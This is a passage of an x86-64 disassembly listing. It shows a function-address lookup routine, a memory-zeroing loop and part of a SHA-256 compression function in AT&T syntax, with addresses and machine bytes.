    6d8c5cbd:	48 8b 0d 8c 67 0f 00 	mov    0xf678c(%rip),%rcx        # 0x6d9bc450
    6d8c5cc4:	48 8d 15 16 ca 00 00 	lea    0xca16(%rip),%rdx        # 0x6d8d26e1
    6d8c5ccb:	e8 7e ee ff ff       	call   0x6d8c4b4e
    6d8c5cd0:	48 89 05 31 8b 10 00 	mov    %rax,0x108b31(%rip)        # 0x6d9ce808
    6d8c5cd7:	48 83 c4 28          	add    $0x28,%rsp
    6d8c5cdb:	c3                   	ret
    6d8c5cdc:	90                   	nop
    6d8c5cdd:	90                   	nop
    6d8c5cde:	90                   	nop
    6d8c5cdf:	90                   	nop
    6d8c5ce0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c5ce4:	48 8d 0d b5 ca 00 00 	lea    0xcab5(%rip),%rcx        # 0x6d8d27a0
    6d8c5ceb:	e8 67 ed ff ff       	call   0x6d8c4a57
    6d8c5cf0:	48 85 c0             	test   %rax,%rax
    6d8c5cf3:	48 89 05 66 67 0f 00 	mov    %rax,0xf6766(%rip)        # 0x6d9bc460
    6d8c5cfa:	75 0c                	jne    0x6d8c5d08
    6d8c5cfc:	48 8d 0d 7d ca 00 00 	lea    0xca7d(%rip),%rcx        # 0x6d8d2780
    6d8c5d03:	e8 66 ed ff ff       	call   0x6d8c4a6e
    6d8c5d08:	48 8b 0d 51 67 0f 00 	mov    0xf6751(%rip),%rcx        # 0x6d9bc460
    6d8c5d0f:	48 8d 15 2a ca 00 00 	lea    0xca2a(%rip),%rdx        # 0x6d8d2740
    6d8c5d16:	e8 33 ee ff ff       	call   0x6d8c4b4e
    6d8c5d1b:	48 8b 0d 3e 67 0f 00 	mov    0xf673e(%rip),%rcx        # 0x6d9bc460
    6d8c5d22:	48 8d 15 24 ca 00 00 	lea    0xca24(%rip),%rdx        # 0x6d8d274d
    6d8c5d29:	48 89 05 f0 8a 10 00 	mov    %rax,0x108af0(%rip)        # 0x6d9ce820
    6d8c5d30:	e8 19 ee ff ff       	call   0x6d8c4b4e
    6d8c5d35:	48 8b 0d 24 67 0f 00 	mov    0xf6724(%rip),%rcx        # 0x6d9bc460
    6d8c5d3c:	48 8d 15 19 ca 00 00 	lea    0xca19(%rip),%rdx        # 0x6d8d275c
    6d8c5d43:	48 89 05 de 8a 10 00 	mov    %rax,0x108ade(%rip)        # 0x6d9ce828
    6d8c5d4a:	e8 ff ed ff ff       	call   0x6d8c4b4e
    6d8c5d4f:	48 89 05 c2 8a 10 00 	mov    %rax,0x108ac2(%rip)        # 0x6d9ce818
    6d8c5d56:	48 83 c4 28          	add    $0x28,%rsp
    6d8c5d5a:	c3                   	ret
    6d8c5d5b:	90                   	nop
    6d8c5d5c:	90                   	nop
    6d8c5d5d:	90                   	nop
    6d8c5d5e:	90                   	nop
    6d8c5d5f:	90                   	nop
    6d8c5d60:	57                   	push   %rdi
    6d8c5d61:	48 83 ec 10          	sub    $0x10,%rsp
    6d8c5d65:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
    6d8c5d6a:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
    6d8c5d6f:	48 85 c0             	test   %rax,%rax
    6d8c5d72:	74 29                	je     0x6d8c5d9d
    6d8c5d74:	48 89 cf             	mov    %rcx,%rdi
    6d8c5d77:	31 c0                	xor    %eax,%eax
    6d8c5d79:	48 89 d1             	mov    %rdx,%rcx
    6d8c5d7c:	f3 aa                	rep stos %al,(%rdi)
    6d8c5d7e:	48 85 d2             	test   %rdx,%rdx
    6d8c5d81:	7e 1a                	jle    0x6d8c5d9d
    6d8c5d83:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
    6d8c5d88:	48 ff ca             	dec    %rdx
    6d8c5d8b:	c6 00 00             	movb   $0x0,(%rax)
    6d8c5d8e:	48 8b 44 24 08       	mov    0x8(%rsp),%rax
    6d8c5d93:	48 ff c0             	inc    %rax
    6d8c5d96:	48 89 44 24 08       	mov    %rax,0x8(%rsp)
    6d8c5d9b:	eb e1                	jmp    0x6d8c5d7e
    6d8c5d9d:	48 83 c4 10          	add    $0x10,%rsp
    6d8c5da1:	5f                   	pop    %rdi
    6d8c5da2:	c3                   	ret
    6d8c5da3:	48 89 ca             	mov    %rcx,%rdx
    6d8c5da6:	48 8b 0d b3 29 0f 00 	mov    0xf29b3(%rip),%rcx        # 0x6d9b8760
    6d8c5dad:	e9 5d ea ff ff       	jmp    0x6d8c480f
    6d8c5db2:	90                   	nop
    6d8c5db3:	90                   	nop
    6d8c5db4:	90                   	nop
    6d8c5db5:	90                   	nop
    6d8c5db6:	90                   	nop
    6d8c5db7:	90                   	nop
    6d8c5db8:	90                   	nop
    6d8c5db9:	90                   	nop
    6d8c5dba:	90                   	nop
    6d8c5dbb:	90                   	nop
    6d8c5dbc:	90                   	nop
    6d8c5dbd:	90                   	nop
    6d8c5dbe:	90                   	nop
    6d8c5dbf:	90                   	nop
    6d8c5dc0:	41 57                	push   %r15
    6d8c5dc2:	41 56                	push   %r14
    6d8c5dc4:	41 55                	push   %r13
    6d8c5dc6:	41 54                	push   %r12
    6d8c5dc8:	55                   	push   %rbp
    6d8c5dc9:	57                   	push   %rdi
    6d8c5dca:	56                   	push   %rsi
    6d8c5dcb:	53                   	push   %rbx
    6d8c5dcc:	48 81 ec 08 01 00 00 	sub    $0x108,%rsp
    6d8c5dd3:	8b 02                	mov    (%rdx),%eax
    6d8c5dd5:	0f c8                	bswap  %eax
    6d8c5dd7:	89 04 24             	mov    %eax,(%rsp)
    6d8c5dda:	8b 42 04             	mov    0x4(%rdx),%eax
    6d8c5ddd:	49 89 e0             	mov    %rsp,%r8
    6d8c5de0:	4d 8d 98 c0 00 00 00 	lea    0xc0(%r8),%r11
    6d8c5de7:	0f c8                	bswap  %eax
    6d8c5de9:	89 44 24 04          	mov    %eax,0x4(%rsp)
    6d8c5ded:	8b 42 08             	mov    0x8(%rdx),%eax
    6d8c5df0:	0f c8                	bswap  %eax
    6d8c5df2:	89 44 24 08          	mov    %eax,0x8(%rsp)
    6d8c5df6:	8b 42 0c             	mov    0xc(%rdx),%eax
    6d8c5df9:	0f c8                	bswap  %eax
    6d8c5dfb:	89 44 24 0c          	mov    %eax,0xc(%rsp)
    6d8c5dff:	8b 42 10             	mov    0x10(%rdx),%eax
    6d8c5e02:	0f c8                	bswap  %eax
    6d8c5e04:	89 44 24 10          	mov    %eax,0x10(%rsp)
    6d8c5e08:	8b 42 14             	mov    0x14(%rdx),%eax
    6d8c5e0b:	0f c8                	bswap  %eax
    6d8c5e0d:	89 44 24 14          	mov    %eax,0x14(%rsp)
    6d8c5e11:	8b 42 18             	mov    0x18(%rdx),%eax
    6d8c5e14:	0f c8                	bswap  %eax
    6d8c5e16:	89 44 24 18          	mov    %eax,0x18(%rsp)
    6d8c5e1a:	8b 42 1c             	mov    0x1c(%rdx),%eax
    6d8c5e1d:	0f c8                	bswap  %eax
    6d8c5e1f:	89 44 24 1c          	mov    %eax,0x1c(%rsp)
    6d8c5e23:	8b 42 20             	mov    0x20(%rdx),%eax
    6d8c5e26:	0f c8                	bswap  %eax
    6d8c5e28:	89 44 24 20          	mov    %eax,0x20(%rsp)
    6d8c5e2c:	8b 42 24             	mov    0x24(%rdx),%eax
    6d8c5e2f:	0f c8                	bswap  %eax
    6d8c5e31:	89 44 24 24          	mov    %eax,0x24(%rsp)
    6d8c5e35:	8b 42 28             	mov    0x28(%rdx),%eax
    6d8c5e38:	0f c8                	bswap  %eax
    6d8c5e3a:	89 44 24 28          	mov    %eax,0x28(%rsp)
    6d8c5e3e:	8b 42 2c             	mov    0x2c(%rdx),%eax
    6d8c5e41:	0f c8                	bswap  %eax
    6d8c5e43:	89 44 24 2c          	mov    %eax,0x2c(%rsp)
    6d8c5e47:	8b 42 30             	mov    0x30(%rdx),%eax
    6d8c5e4a:	0f c8                	bswap  %eax
    6d8c5e4c:	89 44 24 30          	mov    %eax,0x30(%rsp)
    6d8c5e50:	8b 42 34             	mov    0x34(%rdx),%eax
    6d8c5e53:	0f c8                	bswap  %eax
    6d8c5e55:	89 44 24 34          	mov    %eax,0x34(%rsp)
    6d8c5e59:	8b 42 38             	mov    0x38(%rdx),%eax
    6d8c5e5c:	0f c8                	bswap  %eax
    6d8c5e5e:	89 44 24 38          	mov    %eax,0x38(%rsp)
    6d8c5e62:	8b 42 3c             	mov    0x3c(%rdx),%eax
    6d8c5e65:	0f c8                	bswap  %eax
    6d8c5e67:	89 44 24 3c          	mov    %eax,0x3c(%rsp)
    6d8c5e6b:	45 8b 50 38          	mov    0x38(%r8),%r10d
    6d8c5e6f:	49 83 c0 04          	add    $0x4,%r8
    6d8c5e73:	45 8b 08             	mov    (%r8),%r9d
    6d8c5e76:	44 89 d2             	mov    %r10d,%edx
    6d8c5e79:	44 89 d0             	mov    %r10d,%eax
    6d8c5e7c:	41 c1 ea 0a          	shr    $0xa,%r10d
    6d8c5e80:	c1 c0 0d             	rol    $0xd,%eax
    6d8c5e83:	c1 c2 0f             	rol    $0xf,%edx
    6d8c5e86:	31 c2                	xor    %eax,%edx
    6d8c5e88:	44 89 c8             	mov    %r9d,%eax
    6d8c5e8b:	44 31 d2             	xor    %r10d,%edx
    6d8c5e8e:	45 8b 50 fc          	mov    -0x4(%r8),%r10d
    6d8c5e92:	c1 c8 07             	ror    $0x7,%eax
    6d8c5e95:	45 03 50 20          	add    0x20(%r8),%r10d
    6d8c5e99:	44 01 d2             	add    %r10d,%edx
    6d8c5e9c:	45 89 ca             	mov    %r9d,%r10d
    6d8c5e9f:	41 c1 e9 03          	shr    $0x3,%r9d
    6d8c5ea3:	41 c1 c2 0e          	rol    $0xe,%r10d
    6d8c5ea7:	44 31 d0             	xor    %r10d,%eax
    6d8c5eaa:	44 31 c8             	xor    %r9d,%eax
    6d8c5ead:	01 d0                	add    %edx,%eax
    6d8c5eaf:	41 89 40 3c          	mov    %eax,0x3c(%r8)
    6d8c5eb3:	4d 39 c3             	cmp    %r8,%r11
    6d8c5eb6:	75 b3                	jne    0x6d8c5e6b
    6d8c5eb8:	44 8b 59 10          	mov    0x10(%rcx),%r11d
    6d8c5ebc:	8b 14 24             	mov    (%rsp),%edx
    6d8c5ebf:	8b 79 1c             	mov    0x1c(%rcx),%edi
    6d8c5ec2:	8b 19                	mov    (%rcx),%ebx
    6d8c5ec4:	44 89 d8             	mov    %r11d,%eax
    6d8c5ec7:	45 89 d8             	mov    %r11d,%r8d
    6d8c5eca:	8b 71 04             	mov    0x4(%rcx),%esi
    6d8c5ecd:	41 c1 c8 0b          	ror    $0xb,%r8d
    6d8c5ed1:	c1 c8 06             	ror    $0x6,%eax
    6d8c5ed4:	44 8b 49 08          	mov    0x8(%rcx),%r9d
    6d8c5ed8:	44 31 c0             	xor    %r8d,%eax
    6d8c5edb:	45 89 d8             	mov    %r11d,%r8d
    6d8c5ede:	44 8b 61 0c          	mov    0xc(%rcx),%r12d
    6d8c5ee2:	41 c1 c0 07          	rol    $0x7,%r8d
    6d8c5ee6:	44 8b 71 08          	mov    0x8(%rcx),%r14d
    6d8c5eea:	41 89 da             	mov    %ebx,%r10d
    6d8c5eed:	44 31 c0             	xor    %r8d,%eax
    6d8c5ef0:	44 8d 84 17 98 2f 8a 	lea    0x428a2f98(%rdi,%rdx,1),%r8d
    6d8c5ef7:	42 
    6d8c5ef8:	44 89 da             	mov    %r11d,%edx
    6d8c5efb:	41 21 f1             	and    %esi,%r9d
    6d8c5efe:	8b 79 18             	mov    0x18(%rcx),%edi
    6d8c5f01:	41 01 c0             	add    %eax,%r8d
    6d8c5f04:	8b 41 14             	mov    0x14(%rcx),%eax
    6d8c5f07:	f7 d2                	not    %edx
    6d8c5f09:	23 51 18             	and    0x18(%rcx),%edx
    6d8c5f0c:	44 21 d8             	and    %r11d,%eax
    6d8c5f0f:	31 c2                	xor    %eax,%edx
    6d8c5f11:	41 8d 04 10          	lea    (%r8,%rdx,1),%eax
    6d8c5f15:	89 da                	mov    %ebx,%edx
    6d8c5f17:	41 89 d8             	mov    %ebx,%r8d
    6d8c5f1a:	41 c1 c8 0d          	ror    $0xd,%r8d
    6d8c5f1e:	c1 ca 02             	ror    $0x2,%edx
    6d8c5f21:	41 01 c4             	add    %eax,%r12d
    6d8c5f24:	44 31 c2             	xor    %r8d,%edx
    6d8c5f27:	41 89 d8             	mov    %ebx,%r8d
    6d8c5f2a:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c5f2e:	41 31 d0             	xor    %edx,%r8d
    6d8c5f31:	8b 51 08             	mov    0x8(%rcx),%edx
    6d8c5f34:	31 f2                	xor    %esi,%edx
    6d8c5f36:	21 da                	and    %ebx,%edx
    6d8c5f38:	44 31 ca             	xor    %r9d,%edx
    6d8c5f3b:	45 89 e1             	mov    %r12d,%r9d
    6d8c5f3e:	44 01 c2             	add    %r8d,%edx
    6d8c5f41:	45 89 e0             	mov    %r12d,%r8d
    6d8c5f44:	41 c1 c9 0b          	ror    $0xb,%r9d
    6d8c5f48:	01 c2                	add    %eax,%edx
    6d8c5f4a:	8b 44 24 04          	mov    0x4(%rsp),%eax
    6d8c5f4e:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c5f52:	45 31 c8             	xor    %r9d,%r8d
    6d8c5f55:	45 89 e1             	mov    %r12d,%r9d
    6d8c5f58:	41 89 d7             	mov    %edx,%r15d
    6d8c5f5b:	41 c1 c1 07          	rol    $0x7,%r9d
    6d8c5f5f:	45 31 c8             	xor    %r9d,%r8d
    6d8c5f62:	44 8d 8c 07 91 44 37 	lea    0x71374491(%rdi,%rax,1),%r9d
    6d8c5f69:	71 
    6d8c5f6a:	44 89 e0             	mov    %r12d,%eax
    6d8c5f6d:	8b 79 14             	mov    0x14(%rcx),%edi
    6d8c5f70:	f7 d0                	not    %eax
    6d8c5f72:	23 41 14             	and    0x14(%rcx),%eax
    6d8c5f75:	45 01 c1             	add    %r8d,%r9d
    6d8c5f78:	45 89 d8             	mov    %r11d,%r8d
    6d8c5f7b:	45 21 e0             	and    %r12d,%r8d
    6d8c5f7e:	44 31 c0             	xor    %r8d,%eax
    6d8c5f81:	45 8d 04 01          	lea    (%r9,%rax,1),%r8d
    6d8c5f85:	41 89 d1             	mov    %edx,%r9d
    6d8c5f88:	89 d0                	mov    %edx,%eax
    6d8c5f8a:	45 01 c6             	add    %r8d,%r14d
    6d8c5f8d:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c5f91:	c1 c8 0d             	ror    $0xd,%eax
    6d8c5f94:	41 21 f2             	and    %esi,%r10d
    6d8c5f97:	41 31 c1             	xor    %eax,%r9d
    6d8c5f9a:	89 d0                	mov    %edx,%eax
    6d8c5f9c:	c1 c0 0a             	rol    $0xa,%eax
    6d8c5f9f:	41 31 c1             	xor    %eax,%r9d
    6d8c5fa2:	89 d8                	mov    %ebx,%eax
    6d8c5fa4:	31 f0                	xor    %esi,%eax
    6d8c5fa6:	21 d0                	and    %edx,%eax
    6d8c5fa8:	44 31 d0             	xor    %r10d,%eax
    6d8c5fab:	45 89 f2             	mov    %r14d,%r10d
    6d8c5fae:	44 01 c8             	add    %r9d,%eax
    6d8c5fb1:	45 89 f1             	mov    %r14d,%r9d
    6d8c5fb4:	41 f7 d2             	not    %r10d
    6d8c5fb7:	44 01 c0             	add    %r8d,%eax
    6d8c5fba:	45 89 f0             	mov    %r14d,%r8d
    6d8c5fbd:	41 c1 c9 0b          	ror    $0xb,%r9d
    6d8c5fc1:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c5fc5:	45 21 da             	and    %r11d,%r10d
    6d8c5fc8:	45 31 c8             	xor    %r9d,%r8d
    6d8c5fcb:	45 89 f1             	mov    %r14d,%r9d
    6d8c5fce:	41 c1 c1 07          	rol    $0x7,%r9d
    6d8c5fd2:	45 31 c8             	xor    %r9d,%r8d
    6d8c5fd5:	44 8b 4c 24 08       	mov    0x8(%rsp),%r9d
    6d8c5fda:	46 8d 8c 0f cf fb c0 	lea    -0x4a3f0431(%rdi,%r9,1),%r9d
    6d8c5fe1:	b5 
    6d8c5fe2:	89 df                	mov    %ebx,%edi
    6d8c5fe4:	45 01 c1             	add    %r8d,%r9d
    6d8c5fe7:	45 89 e0             	mov    %r12d,%r8d
    6d8c5fea:	21 d7                	and    %edx,%edi
    6d8c5fec:	45 21 f0             	and    %r14d,%r8d
    6d8c5fef:	45 31 d0             	xor    %r10d,%r8d
    6d8c5ff2:	41 89 c2             	mov    %eax,%r10d
    6d8c5ff5:	45 01 c8             	add    %r9d,%r8d
    6d8c5ff8:	41 89 c1             	mov    %eax,%r9d
    6d8c5ffb:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c5fff:	42 8d 2c 06          	lea    (%rsi,%r8,1),%ebp
    6d8c6003:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c6007:	45 31 d1             	xor    %r10d,%r9d
    6d8c600a:	41 89 c2             	mov    %eax,%r10d
    6d8c600d:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c6011:	45 31 d1             	xor    %r10d,%r9d
    6d8c6014:	41 89 da             	mov    %ebx,%r10d
    6d8c6017:	41 31 d2             	xor    %edx,%r10d
    6d8c601a:	41 21 c2             	and    %eax,%r10d
    6d8c601d:	41 31 fa             	xor    %edi,%r10d
    6d8c6020:	89 ef                	mov    %ebp,%edi
    6d8c6022:	45 01 ca             	add    %r9d,%r10d
    6d8c6025:	44 8b 4c 24 0c       	mov    0xc(%rsp),%r9d
    6d8c602a:	c1 cf 06             	ror    $0x6,%edi
    6d8c602d:	45 01 c2             	add    %r8d,%r10d
    6d8c6030:	41 89 e8             	mov    %ebp,%r8d
    6d8c6033:	41 c1 c8 0b          	ror    $0xb,%r8d
    6d8c6037:	45 89 d5             	mov    %r10d,%r13d
    6d8c603a:	41 21 c7             	and    %eax,%r15d
    6d8c603d:	41 31 f8             	xor    %edi,%r8d
    6d8c6040:	89 ef                	mov    %ebp,%edi
    6d8c6042:	41 c1 cd 0d          	ror    $0xd,%r13d
    6d8c6046:	c1 c7 07             	rol    $0x7,%edi
    6d8c6049:	41 31 f8             	xor    %edi,%r8d
    6d8c604c:	43 8d bc 0b a5 db b5 	lea    -0x164a245b(%r11,%r9,1),%edi
    6d8c6053:	e9 
    6d8c6054:	41 89 e9             	mov    %ebp,%r9d
    6d8c6057:	44 01 c7             	add    %r8d,%edi
    6d8c605a:	41 f7 d1             	not    %r9d
    6d8c605d:	45 89 f0             	mov    %r14d,%r8d
    6d8c6060:	45 21 e1             	and    %r12d,%r9d
    6d8c6063:	41 21 e8             	and    %ebp,%r8d
    6d8c6066:	45 31 c8             	xor    %r9d,%r8d
    6d8c6069:	45 89 d1             	mov    %r10d,%r9d
    6d8c606c:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c6070:	41 01 f8             	add    %edi,%r8d
    6d8c6073:	42 8d 3c 03          	lea    (%rbx,%r8,1),%edi
    6d8c6077:	45 31 cd             	xor    %r9d,%r13d
    6d8c607a:	45 89 d1             	mov    %r10d,%r9d
    6d8c607d:	41 c1 c1 0a          	rol    $0xa,%r9d
    6d8c6081:	45 31 cd             	xor    %r9d,%r13d
    6d8c6084:	41 89 d1             	mov    %edx,%r9d
    6d8c6087:	41 31 c1             	xor    %eax,%r9d
    6d8c608a:	45 21 d1             	and    %r10d,%r9d
    6d8c608d:	45 31 f9             	xor    %r15d,%r9d
    6d8c6090:	41 89 c7             	mov    %eax,%r15d
    6d8c6093:	45 01 e9             	add    %r13d,%r9d
    6d8c6096:	41 89 fd             	mov    %edi,%r13d
    6d8c6099:	45 01 c1             	add    %r8d,%r9d
    6d8c609c:	41 89 f8             	mov    %edi,%r8d
    6d8c609f:	41 c1 cd 0b          	ror    $0xb,%r13d
    6d8c60a3:	41 c1 c8 06          	ror    $0x6,%r8d
    6d8c60a7:	45 31 e8             	xor    %r13d,%r8d
    6d8c60aa:	41 89 fd             	mov    %edi,%r13d
    6d8c60ad:	41 c1 c5 07          	rol    $0x7,%r13d
    6d8c60b1:	45 31 c5             	xor    %r8d,%r13d
    6d8c60b4:	44 8b 44 24 10       	mov    0x10(%rsp),%r8d
    6d8c60b9:	47 8d a4 04 5b c2 56 	lea    0x3956c25b(%r12,%r8,1),%r12d
    6d8c60c0:	39 
    6d8c60c1:	41 89 f8             	mov    %edi,%r8d
    6d8c60c4:	45 01 e5             	add    %r12d,%r13d
    6d8c60c7:	41 f7 d0             	not    %r8d
    6d8c60ca:	41 89 ec             	mov    %ebp,%r12d
    6d8c60cd:	45 21 f0             	and    %r14d,%r8d
    6d8c60d0:	41 21 fc             	and    %edi,%r12d
    6d8c60d3:	45 31 c4             	xor    %r8d,%r12d
    6d8c60d6:	45 89 c8             	mov    %r9d,%r8d
    6d8c60d9:	45 01 ec             	add    %r13d,%r12d
    6d8c60dc:	41 c1 c8 02          	ror    $0x2,%r8d
    6d8c60e0:	46 8d 2c 22          	lea    (%rdx,%r12,1),%r13d
    6d8c60e4:	44 89 ca             	mov    %r9d,%edx
    6d8c60e7:	c1 ca 0d             	ror    $0xd,%edx
    6d8c60ea:	44 31 c2             	xor    %r8d,%edx
    6d8c60ed:	45 89 c8             	mov    %r9d,%r8d
    6d8c60f0:	45 21 d7             	and    %r10d,%r15d
    6d8c60f3:	41 c1 c0 0a          	rol    $0xa,%r8d
    6d8c60f7:	44 31 c2             	xor    %r8d,%edx
    6d8c60fa:	41 89 c0             	mov    %eax,%r8d
    6d8c60fd:	45 31 d0             	xor    %r10d,%r8d
    6d8c6100:	45 21 c8             	and    %r9d,%r8d
    6d8c6103:	45 31 f8             	xor    %r15d,%r8d
    6d8c6106:	45 89 d7             	mov    %r10d,%r15d
    6d8c6109:	41 01 d0             	add    %edx,%r8d
    6d8c610c:	44 89 ea             	mov    %r13d,%edx
    6d8c610f:	45 21 cf             	and    %r9d,%r15d
    6d8c6112:	45 01 e0             	add    %r12d,%r8d
    6d8c6115:	45 89 ec             	mov    %r13d,%r12d
    6d8c6118:	c1 ca 06             	ror    $0x6,%edx
    6d8c611b:	41 c1 cc 0b          	ror    $0xb,%r12d
    6d8c611f:	44 31 e2             	xor    %r12d,%edx
    6d8c6122:	45 89 ec             	mov    %r13d,%r12d
    6d8c6125:	41 c1 c4 07          	rol    $0x7,%r12d
    6d8c6129:	41 31 d4             	xor    %edx,%r12d
    6d8c612c:	8b 54 24 14          	mov    0x14(%rsp),%edx
    6d8c6130:	45 8d b4 16 f1 11 f1 	lea    0x59f111f1(%r14,%rdx,1),%r14d
    6d8c6137:	59 
    6d8c6138:	44 89 ea             	mov    %r13d,%edx
    6d8c613b:	45 01 f4             	add    %r14d,%r12d
    6d8c613e:	f7 d2                	not    %edx
    6d8c6140:	41 89 fe             	mov    %edi,%r14d
    6d8c6143:	21 ea                	and    %ebp,%edx
    6d8c6145:	45 21 ee             	and    %r13d,%r14d
    6d8c6148:	41 31 d6             	xor    %edx,%r14d
    6d8c614b:	44 89 c2             	mov    %r8d,%edx
    6d8c614e:	45 01 e6             	add    %r12d,%r14d
    6d8c6151:	c1 ca 02             	ror    $0x2,%edx
    6d8c6154:	46 8d 24 30          	lea    (%rax,%r14,1),%r12d
    6d8c6158:	44 89 c0             	mov    %r8d,%eax
    6d8c615b:	c1 c8 0d             	ror    $0xd,%eax
    6d8c615e:	31 d0                	xor    %edx,%eax
    6d8c6160:	44 89 c2             	mov    %r8d,%edx
    6d8c6163:	c1 c2 0a             	rol    $0xa,%edx
    6d8c6166:	31 d0                	xor    %edx,%eax
    6d8c6168:	44 89 d2             	mov    %r10d,%edx
    6d8c616b:	44 31 ca             	xor    %r9d,%edx
    6d8c616e:	44 21 c2             	and    %r8d,%edx
    6d8c6171:	44 31 fa             	xor    %r15d,%edx
    6d8c6174:	45 89 cf             	mov    %r9d,%r15d
    6d8c6177:	01 c2                	add    %eax,%edx
    6d8c6179:	44 89 e0             	mov    %r12d,%eax
    6d8c617c:	44 01 f2             	add    %r14d,%edx
    6d8c617f:	45 89 e6             	mov    %r12d,%r14d
    6d8c6182:	c1 c8 06             	ror    $0x6,%eax
    6d8c6185:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6189:	44 31 f0             	xor    %r14d,%eax
    6d8c618c:	45 89 e6             	mov    %r12d,%r14d
    6d8c618f:	45 21 c7             	and    %r8d,%r15d
    6d8c6192:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6196:	41 31 c6             	xor    %eax,%r14d
    6d8c6199:	8b 44 24 18          	mov    0x18(%rsp),%eax
    6d8c619d:	8d ac 05 a4 82 3f 92 	lea    -0x6dc07d5c(%rbp,%rax,1),%ebp
    6d8c61a4:	44 89 e0             	mov    %r12d,%eax
    6d8c61a7:	44 01 f5             	add    %r14d,%ebp
    6d8c61aa:	f7 d0                	not    %eax
    6d8c61ac:	45 89 ee             	mov    %r13d,%r14d
    6d8c61af:	21 f8                	and    %edi,%eax
    6d8c61b1:	45 21 e6             	and    %r12d,%r14d
    6d8c61b4:	41 31 c6             	xor    %eax,%r14d
    6d8c61b7:	89 d0                	mov    %edx,%eax
    6d8c61b9:	41 01 ee             	add    %ebp,%r14d
    6d8c61bc:	c1 c8 02             	ror    $0x2,%eax
    6d8c61bf:	43 8d 2c 32          	lea    (%r10,%r14,1),%ebp
    6d8c61c3:	41 89 d2             	mov    %edx,%r10d
    6d8c61c6:	41 c1 ca 0d          	ror    $0xd,%r10d
    6d8c61ca:	41 31 c2             	xor    %eax,%r10d
    6d8c61cd:	89 d0                	mov    %edx,%eax
    6d8c61cf:	c1 c0 0a             	rol    $0xa,%eax
    6d8c61d2:	41 31 c2             	xor    %eax,%r10d
    6d8c61d5:	44 89 c8             	mov    %r9d,%eax
    6d8c61d8:	44 31 c0             	xor    %r8d,%eax
    6d8c61db:	21 d0                	and    %edx,%eax
    6d8c61dd:	44 31 f8             	xor    %r15d,%eax
    6d8c61e0:	45 89 c7             	mov    %r8d,%r15d
    6d8c61e3:	44 01 d0             	add    %r10d,%eax
    6d8c61e6:	41 89 ea             	mov    %ebp,%r10d
    6d8c61e9:	44 01 f0             	add    %r14d,%eax
    6d8c61ec:	41 89 ee             	mov    %ebp,%r14d
    6d8c61ef:	41 c1 ca 06          	ror    $0x6,%r10d
    6d8c61f3:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c61f7:	45 31 f2             	xor    %r14d,%r10d
    6d8c61fa:	41 89 ee             	mov    %ebp,%r14d
    6d8c61fd:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c6201:	45 31 d6             	xor    %r10d,%r14d
    6d8c6204:	44 8b 54 24 1c       	mov    0x1c(%rsp),%r10d
    6d8c6209:	42 8d bc 17 d5 5e 1c 	lea    -0x54e3a12b(%rdi,%r10,1),%edi
    6d8c6210:	ab 
    6d8c6211:	41 89 ea             	mov    %ebp,%r10d
    6d8c6214:	44 01 f7             	add    %r14d,%edi
    6d8c6217:	41 f7 d2             	not    %r10d
    6d8c621a:	45 89 e6             	mov    %r12d,%r14d
    6d8c621d:	45 21 ea             	and    %r13d,%r10d
    6d8c6220:	41 21 ee             	and    %ebp,%r14d
    6d8c6223:	45 31 d6             	xor    %r10d,%r14d
    6d8c6226:	41 89 c2             	mov    %eax,%r10d
    6d8c6229:	41 01 fe             	add    %edi,%r14d
    6d8c622c:	41 c1 ca 02          	ror    $0x2,%r10d
    6d8c6230:	43 8d 3c 31          	lea    (%r9,%r14,1),%edi
    6d8c6234:	41 89 c1             	mov    %eax,%r9d
    6d8c6237:	41 c1 c9 0d          	ror    $0xd,%r9d
    6d8c623b:	45 31 d1             	xor    %r10d,%r9d
    6d8c623e:	41 89 c2             	mov    %eax,%r10d
    6d8c6241:	41 c1 c2 0a          	rol    $0xa,%r10d
    6d8c6245:	41 21 d7             	and    %edx,%r15d
    6d8c6248:	45 31 d1             	xor    %r10d,%r9d
    6d8c624b:	45 89 c2             	mov    %r8d,%r10d
    6d8c624e:	41 31 d2             	xor    %edx,%r10d
    6d8c6251:	41 21 c2             	and    %eax,%r10d
    6d8c6254:	45 31 fa             	xor    %r15d,%r10d
    6d8c6257:	41 89 d7             	mov    %edx,%r15d
    6d8c625a:	45 01 ca             	add    %r9d,%r10d
    6d8c625d:	41 89 f9             	mov    %edi,%r9d
    6d8c6260:	41 21 c7             	and    %eax,%r15d
    6d8c6263:	45 01 f2             	add    %r14d,%r10d
    6d8c6266:	41 89 fe             	mov    %edi,%r14d
    6d8c6269:	41 c1 c9 06          	ror    $0x6,%r9d
    6d8c626d:	41 c1 ce 0b          	ror    $0xb,%r14d
    6d8c6271:	45 31 f1             	xor    %r14d,%r9d
    6d8c6274:	41 89 fe             	mov    %edi,%r14d
    6d8c6277:	41 c1 c6 07          	rol    $0x7,%r14d
    6d8c627b:	45 31 ce             	xor    %r9d,%r14d
    6d8c627e:	44 8b 4c 24 20       	mov    0x20(%rsp),%r9d
    6d8c6283:	47 8d ac 0d 98 aa 07 	lea    -0x27f85568(%r13,%r9,1),%r13d
    6d8c628a:	d8 
    6d8c628b:	41 89 f9             	mov    %edi,%r9d
    6d8c628e:	45 01 f5             	add    %r14d,%r13d
    6d8c6291:	41 f7 d1             	not    %r9d
    6d8c6294:	41 89 ee             	mov    %ebp,%r14d
    6d8c6297:	45 21 e1             	and    %r12d,%r9d
    6d8c629a:	41 21 fe             	and    %edi,%r14d
    6d8c629d:	45 31 ce             	xor    %r9d,%r14d
    6d8c62a0:	45 89 d1             	mov    %r10d,%r9d
    6d8c62a3:	45 01 ee             	add    %r13d,%r14d
    6d8c62a6:	41 c1 c9 02          	ror    $0x2,%r9d
    6d8c62aa:	47 8d 2c 30          	lea    (%r8,%r14,1),%r13d
    6d8c62ae:	45 89 d0             	mov    %r10d,%r8d
